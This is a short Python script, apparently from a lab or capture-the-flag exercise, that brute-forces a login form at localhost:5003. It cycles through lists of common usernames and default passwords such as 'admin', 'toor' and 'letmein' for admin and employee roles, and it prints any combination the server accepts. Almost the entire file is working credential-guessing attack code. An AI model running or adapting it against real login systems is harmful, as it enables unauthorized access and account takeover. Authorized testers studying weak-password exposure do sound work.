import urllib.parse, urllib.request, json
from itertools import product

base = 'http://localhost:5003/login'

def try_login(username, password, role):
    data = urllib.parse.urlencode({'username': username, 'password': password, 'role': role}).encode()
    req = urllib.request.Request(base, data=data, method='POST')
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            body = resp.read().decode()
            try:
                j = json.loads(body)
            except Exception:
                return None, body
            return j, None
    except Exception as e:
        return None, str(e)

admin_users = ['admin','administrator','root','superuser']
admin_passes = ['admin','password','admin123','123456','toor','root','pass','letmein','qwerty']
emp_users = ['employee','user','guest','test','john','jane','emp']
emp_passes = ['password','test','guest','123456','qwerty','pass','employee']

found = []
for u,p in product(admin_users, admin_passes):
    j, err = try_login(u,p,'admin')
    if j and j.get('success'):
        found.append(('admin',u,p,j))
        break

for u,p in product(emp_users, emp_passes):
    j, err = try_login(u,p,'employee')
    if j and j.get('success'):
        found.append(('employee',u,p,j))
        break

print(found if found else 'NONE')

